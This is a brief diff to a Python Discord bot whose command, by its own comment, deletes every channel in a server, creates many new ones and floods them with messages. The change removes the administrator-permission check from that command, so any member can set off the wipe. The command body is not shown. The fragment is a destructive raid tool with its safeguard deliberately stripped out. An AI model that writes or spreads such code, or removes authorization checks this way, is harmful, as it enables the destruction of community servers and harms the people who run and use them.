@@ -15,7 +15,6 @@ async def on_ready():
 
 # Command to delete all channels, create multiple new ones, and send messages fast
 @bot.command()
-@commands.has_permissions(administrator=True)
 async def kibidi(ctx):
     guild = ctx.guild  # Use the server where the command was issued
 
